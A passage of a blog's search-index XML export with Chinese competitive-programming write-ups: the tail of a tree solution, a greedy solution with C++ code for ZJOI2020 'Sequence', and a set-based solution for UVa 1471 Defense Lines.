n; i++) <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, nodes[i].cnt);</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, <span class="built_in">dfs</span>(&amp;nodes[<span class="number">1</span>], m));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fclose</span>(stdin);</span><br><span class="line">    <span class="built_in">fclose</span>(stdout);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>2022</tag>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>图论</tag>
        <tag>树</tag>
        <tag>树上差分</tag>
        <tag>YbtOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>「ZJOI2020」序列 - 贪心</title>
    <url>/zjoi2020-seq/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P6631">洛谷链接</a></p>
<p><a href="https://loj.ac/p/3313">LibreOJ 链接</a></p>
<p>Bob 喜欢序列。</p>
<p>有一个长度为 <span class="math inline">\(n\)</span> 的非负整数序列
<span class="math inline">\(a_1, a_2,\cdots,
a_n\)</span>。每一步你可以从以下三种操作中选择一种执行：</p>
<ul>
<li>选择一个区间 <span class="math inline">\([l,
r]\)</span>，将下标在这个区间里的所有数都减 <span
class="math inline">\(1\)</span>。</li>
<li>选择一个区间 <span class="math inline">\([l,
r]\)</span>，将下标在这个区间里且下标为奇数的所有数都减 <span
class="math inline">\(1\)</span>。</li>
<li>选择一个区间 <span class="math inline">\([l,
r]\)</span>，将下标在这个区间里且下标为偶数的所有数都减 <span
class="math inline">\(1\)</span>。</li>
</ul>
<p>求最少需要多少步才能将序列中的所有数都变成 <span
class="math inline">\(0\)</span>。</p>
<p>对于所有的数据，<span class="math inline">\(1 \leq n \leq 100000, 0
\leq a_i \leq 10^9, 1 \leq T \leq 10\)</span>。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p><del>我甚至菜到这是我做得第一道黑题</del></p>
<h2 id="模型构建">模型构建</h2>
<p>对于这道题，我们可以用基于贪心的思想解决。</p>
<p>首先明确两个概念：</p>
<ol type="1">
<li>对于第一种情况，由于在区间中减去的数是连续的，我们可以将其形象地称为
<strong>直线</strong>，命名为变量 <span
class="math inline">\(\text{line}_i\)</span>；</li>
<li>对于第二种情况，由于在区间中减去的数是不连续且有规律的间隔的，我们可以将其形象地称为
<strong>跳线</strong>，命名为变量 <span
class="math inline">\(\text{dance}_i\)</span>。</li>
</ol>
<p>基于类似于数学归纳法的思想，我们可以设想对于第 <span
class="math inline">\(i\)</span> 个数，前面的 <span
class="math inline">\(i -  1\)</span> 个数中每个数 <span
class="math inline">\(a_j\)</span> 在使用了 <span
class="math inline">\(\text{line}_j\)</span> 个直线和 <span
class="math inline">\(\text{dance}_j\)</span> 个跳线的情况下全部处理为
<span class="math inline">\(0\)</span>。在这种情况下求需要总共 <span
class="math inline">\(\text{line}_i\)</span> 个直线与 <span
class="math inline">\(\text{dance}_i\)</span> 个跳线将前 <span
class="math inline">\(a_i\)</span> 个数全部处理为 <span
class="math inline">\(0\)</span>，同时统计总共使用的线的数量 <span
class="math inline">\(\text{ans}\)</span>。</p>
<p>对于初始化，显然 <span class="math inline">\(\text{line}_0 =
\text{dance}_0 = \text{ans} = 0\)</span>。</p>
<h2 id="情况分析">情况分析</h2>
<p>接下来我们需要分析对于 <span
class="math inline">\(a_i\)</span>，我们使用直线或跳线的情况。</p>
<p>显然这只有下列两种情况：</p>
<ol type="1">
<li>在相邻两项 <span class="math inline">\(\forall i\)</span>，<span
class="math inline">\(a_i &gt;
0\)</span>。我们可以形象地称这个范围是连续的，显然在此时直线和跳线均可使用。在此时
<strong>尽量使用直线</strong> 必定是最优答案的一种。</li>
<li>在相邻两项 <span class="math inline">\(\exists i\)</span>，<span
class="math inline">\(a_i =
0\)</span>。我们可以形象地称这个范围是不连续（跳跃）的，显然此时只能使用跳线。</li>
</ol>
<p>对于情况 <span class="math inline">\(1\)</span>，以下为证明：</p>
<p>我们可以将该区间分为两部分：<span class="math inline">\(a_i = b_i +
c\)</span>，只用跳线处理 <span class="math inline">\(b_i\)</span>。其中
<span class="math inline">\(c \leq \min\limits_{l \leq i \leq
r}\{a_i\}\)</span>。显然对于 <span class="math inline">\(c\)</span>
直接使用直线搞定是最优的。而对于 <span
class="math inline">\(b_i\)</span>
为连续区间的前提下使用直线处理所作用的区间是用跳线的两倍。故要使 <span
class="math inline">\(b_i\)</span> 仅用跳线处理下最优，我们需要让 <span
class="math inline">\(b_i\)</span> 直线可作用区间
<strong>极小</strong>，即不可用直线。此时 <span
class="math inline">\(b_i\)</span> 必定不连续，显然此时 <span
class="math inline">\(c = \min\limits_{l \leq i \leq
r}\{a_i\}\)</span>。故用 <strong>尽量多的直线</strong> 处理掉 <span
class="math inline">\(c\)</span>，剩下的 <strong>不连续</strong> 的
<span class="math inline">\(b\)</span>
用跳线处理。这种操作定是最优答案的一种。</p>
<h2 id="分类讨论">分类讨论</h2>
<p>接下来我们就可以进行分类讨论。我们的目标是将 <span
class="math inline">\(a_i\)</span> 处理为 <span
class="math inline">\(0\)</span>，故遍历到 <span
class="math inline">\(i\)</span> 时，增加的线的数量必定为 <span
class="math inline">\(a_i\)</span>。答案的增量显然是增加线的数量，即
<span class="math inline">\(\text{ans} = \text{ans} +
a_i\)</span>。显然我们只考虑 <span class="math inline">\(a_i\)</span>
无法取到最优，于是我们可以从 <span class="math inline">\(a_{i +
1}\)</span> 入手。</p>
<ol type="1">
<li><p><span class="math inline">\(\text{line}_{i - 1} + \text{dance}_{i
- 1} \leq a_{i + 1}\)</span>：此时已用的线不够为 <span
class="math inline">\(a_{i + 1}\)</span>
作准备，我们需要更多的线来做准备。我们可以先将之前的两种线对 <span
class="math inline">\(a_{i + 1}\)</span> 的作用效果反映出来，即 <span
class="math inline">\(a_{i + 1} = a_{i + 1} - \text{line}_{i - 1} -
\text{dance}_{i - 1}\)</span>，此时 <span class="math inline">\(a_{i +
1} &gt; 0\)</span>。 此时只考虑 <span class="math inline">\(a_{i +
1}\)</span> 是无法做出最优解法的，我们必须同时考虑 <span
class="math inline">\(a_i\)</span>：</p>
<pre><code>1. $a_i \leq a_&#123;i + 1&#125;$：显然全部使用直线即可将 $a_i$ 处理为 $0$。即 $\text&#123;line&#125;_i = \text&#123;line&#125;_&#123;i - 1&#125; + a_i$，$\text&#123;dance&#125;_i = \text&#123;dance&#125;_&#123;i - 2&#125;$，$a_&#123;i + 1&#125; = a_&#123;i + 1&#125; - a_i$，$a_i = 0$；

2. $a_i &gt; a_&#123;i + 1&#125;$：先使用 $a_&#123;i + 1&#125;$ 条直线覆盖，再使用 $a_&#123;i + 1&#125; - a_i$ 条相邻的跳线覆盖，可将 $a_i$ 处理为 $0$。即 $\text&#123;line&#125;_i = \text&#123;line&#125;_&#123;i - 1&#125; + a_&#123;i + 1&#125;$，$\text&#123;dance&#125;_&#123;i + 1&#125; = \text&#123;dance&#125;_&#123;i - 1&#125; + a_i - a_&#123;i + 1&#125;$，$a_i = a_&#123;i + 1&#125; = 0$。</code></pre></li>
<li><p><span class="math inline">\(\text{line}_{i - 1} + \text{dance}_{i
- 1} &gt; a_{i + 1}\)</span>：说明目前我们拥有的线为 <span
class="math inline">\(a_{i + 1}\)</span>
准备过剩了。此时我们就需要考虑停止一些线的作用范围。我们可以记录需要额外停止的数量
<span class="math inline">\(\Delta = \text{line}_{i - 1} +
\text{dance}_{i - 1} - a_{i +
1}\)</span>。由于我们可以发现两种线均与位置有关，故在处理好 <span
class="math inline">\(\Delta\)</span> 后我们需要 <span
class="math inline">\(\text{line}_{i - 1} = \text{line}_{i - 1} -
\Delta\)</span>，<span class="math inline">\(\text{dance}_{i - 1} =
\text{dance}_{i - 1} - \Delta\)</span>。同时记录 <span
class="math inline">\(\text{nxt} = \Delta\)</span>，表示有 <span
class="math inline">\(\Delta\)</span> 条线可从 <span
class="math inline">\(a_{i + 1}\)</span>
恢复出发。这样就可以把该情况转化为情况 <span
class="math inline">\(1\)</span>。处理恢复情况则可在情况 <span
class="math inline">\(1\)</span> 处理后再把 <span
class="math inline">\(\text{nxt}\)</span>
加回去，同时在答案中减去可恢复的线的数量。即 <span
class="math inline">\(a_{i + 1} = a_{i + 1} + \text{nxt}\)</span>，<span
class="math inline">\(\text{ans} = \text{ans} -
\text{nxt}\)</span>。但由于在处理 <span
class="math inline">\(\Delta\)</span> 时 <span
class="math inline">\(\text{line}_{i - 1}\)</span> 和 <span
class="math inline">\(\text{dance}_{i - 1}\)</span>
不能处理为负数，故有下列几种情况特殊考虑：</p>
<ol type="1">
<li><p><span class="math inline">\(\Delta &gt; \text{dance}_{i -
1}\)</span>：这是我们需要直接停止部分的直线，让直线刚好覆盖 <span
class="math inline">\(a_{i + 1}\)</span>。即 <span
class="math inline">\(\text{line}_{i - 1} = a_{i + 1}\)</span>，此时
<span class="math inline">\(\Delta\)</span> 随之变化，即 <span
class="math inline">\(\Delta = \text{dance}_{i - 1}\)</span></p></li>
<li><p><span class="math inline">\(\Delta &gt; \text{line}_{i -
1}\)</span>：这时我们需要直接停止部分的跳线，让跳线刚好覆盖 <span
class="math inline">\(a_{i + 1}\)</span>。即 <span
class="math inline">\(\text{dance}_{i - 1} = a_{i + 1}\)</span>，此时
<span class="math inline">\(\Delta\)</span> 随之变化，即 <span
class="math inline">\(\Delta = \text{line}_{i - 1}\)</span></p></li>
<li><p>情况 <span class="math inline">\(1\)</span>、<span
class="math inline">\(2\)</span> 均不符合，保持现状。</p></li>
</ol></li>
</ol>
<p>最后我们需要解决奇数项和偶数项不同跳线的问题。由于两种跳线可看作作用相同的线，我们可以用两个变量存储两种跳线，然后在遍历
<span class="math inline">\(a_i\)</span>
的跳线不同作用项时不停交换即可，即每遍历到下一项则两种跳线数据交换。</p>
<p>最终时间复杂度为 <span
class="math inline">\(O(n)\)</span>，完全能过。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">100000</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;t);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (t--) &#123;</span><br><span class="line">        <span class="type">int</span> n;</span><br><span class="line">        <span class="type">static</span> <span class="type">long</span> <span class="type">long</span> a[MAXN + <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%lld&quot;</span>, &amp;a[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> line = <span class="number">0</span>, dance1 = <span class="number">0</span>, dance2 = <span class="number">0</span>, ans = <span class="number">0</span>, nxt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a[i + <span class="number">1</span>] &lt; dance1 + line) &#123;</span><br><span class="line">                <span class="type">int</span> delta = dance1 + line - a[i + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (delta &gt; dance1) &#123;</span><br><span class="line">                    line = a[i + <span class="number">1</span>];</span><br><span class="line">                    delta = dance1;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (delta &gt; line) &#123;</span><br><span class="line">                    dance1 = a[i + <span class="number">1</span>];</span><br><span class="line">                    delta = line;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                line -= delta;</span><br><span class="line">                dance1 -= delta;</span><br><span class="line">                nxt = delta;</span><br><span class="line">                a[i + <span class="number">1</span>] -= nxt;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            a[i + <span class="number">1</span>] -= line + dance1;</span><br><span class="line">            ans += a[i];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (a[i] &lt;= a[i + <span class="number">1</span>]) &#123;</span><br><span class="line">                line += a[i];</span><br><span class="line">                a[i + <span class="number">1</span>] -= a[i];</span><br><span class="line">                a[i] = <span class="number">0</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                line += a[i + <span class="number">1</span>];</span><br><span class="line">                dance2 += a[i] - a[i + <span class="number">1</span>];</span><br><span class="line">                a[i] = a[i + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            a[i + <span class="number">1</span>] += nxt;</span><br><span class="line">            ans -= nxt;</span><br><span class="line">            nxt = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            std::<span class="built_in">swap</span>(dance1, dance2);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>, ans);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>省选</tag>
        <tag>贪心</tag>
        <tag>2020</tag>
        <tag>ZJOI</tag>
      </tags>
  </entry>
  <entry>
    <title>「UVa 1471」Defense Lines - 贪心</title>
    <url>/uva-1471/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a
href="https://onlinejudge.org/index.php?option=com_onlinejudge&amp;Itemid=8&amp;category=447&amp;page=show_problem&amp;problem=4217">UVa
链接</a></p>
<p>对于一个长度为 <span class="math inline">\(n (n \le 200000)\)</span>
的序列，可删掉其中一段连续子序列。求删掉后序列的最长上升连续子序列。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>本题我们可以分解为求两段最长上升连续子序列，且满足前一个序列的最后一项小于后一个序列的第一项。我们可以先预处理出以
<span class="math inline">\(i\)</span> 为开头的最长上升连续子序列的长度
<span class="math inline">\(f_i\)</span> 和以 <span
class="math inline">\(i\)</span> 为结尾的最长上升子序列的长度 <span
class="math inline">\(g_i\)</span>。显然就可以得出答案为 <span
class="math inline">\(\max\limits_{1 \le i \le n}\{ f_i + \max\limits_{1
\le j &lt; i \wedge a_i &gt; a_j} g_j
\}\)</span>。但这种做法时间复杂度为 <span
class="math inline">\(O(n^2)\)</span>，无法通过此题。于是我们需要考虑如何优化。</p>
<p>我们可以发现，对于两数 <span class="math inline">\(i\)</span>、<span
class="math inline">\(j\)</span>，若 <span class="math inline">\(g_i \ge
g_j \wedge a_i &lt; a_j\)</span>，则选 <span
class="math inline">\(g_i\)</span> 始终比选 <span
class="math inline">\(g_j\)</span> 更优，于是 <span
class="math inline">\(g_j\)</span>
不会被最优答案选取。我们可以用单调队列的思想，我们可以在对 <span
class="math inline">\(f_i\)</span> 进行遍历的时候维护一个
<code>set</code> 来存储可用的 <span class="math inline">\(g_j (j &lt;
i)\)</span>。每次在 <code>set</code> 中插入 <span
class="math inline">\(g_i\)</span> 时，就删除所有满足 <span
class="math inline">\(g_i \ge g_j \wedge a_i &lt; a_j\)</span> 条件的
<span class="math inline">\(g_j\)</span>。查询时可用
<code>lower_bound</code> 查询满足小于 <span
class="math inline">\(a_i\)</span>
的最大的一个即可。这时复杂度就优化到了 <span class="math inline">\(O(n
\log n)\)</span>。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;set&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">2e5</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">solve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> a[MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> f[MAXN + <span class="number">1</span>], g[MAXN + <span class="number">1</span>];</span><br><span class="line">    g[<span class="number">1</span>] = f[n] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">1</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">if</span> (a[i] &lt; a[i + <span class="number">1</span>]) f[i] = f[i + <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> f[i] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (a[i - <span class="number">1</span>] &lt; a[i]) g[i] = g[i - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> g[i] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ans = <span class="number">1</span>;</span><br><span class="line">    <span class="type">static</span> std::set&lt; std::pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; &gt; s;</span><br><span class="line">    s.<span class="built_in">clear</span>();</span><br><span class="line">    s.<span class="built_in">insert</span>(std::<span class="built_in">make_pair</span>(a[<span class="number">1</span>], g[<span class="number">1</span>]));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        std::set&lt; std::pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; &gt;::iterator it = s.<span class="built_in">lower_bound</span>(std::<span class="built_in">make_pair</span>(a[i], <span class="number">0</span>));</span><br><span class="line">        <span class="type">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (it != s.<span class="built_in">begin</span>()) &#123;</span><br><span class="line">            it--;</span><br><span class="line">            ans = std::<span class="built_in">max</span>(ans, (*it).second + f[i]);</span><br><span class="line">            <span class="keyword">if</span> (g[i] &lt;= (*it).second) flag = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">            std::set&lt; std::pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; &gt;::iterator p = it;</span><br><span class="line">            p++;</span><br><span class="line">            <span class="keyword">while</span> (p != s.<span class="built_in">end</span>() &amp;&amp; (*p).first &gt; a[i] &amp;&amp; (*p).second &lt; g[i]) &#123;</span><br><span class="line">                it = p;</span><br><span class="line">                p++;</span><br><span class="line">                s.<span class="built_in">erase</span>(it);</span><br><span class="line">            &#125;</span><br><span class="line">            s.<span class="built_in">insert</span>(std::<span class="built_in">make_pair</span>(a[i], g[i]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> t;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;t);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (t--) <span class="built_in">solve</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>贪心</tag>
        <tag>UVa</tag>
      </tags>
  </entry>
</search>
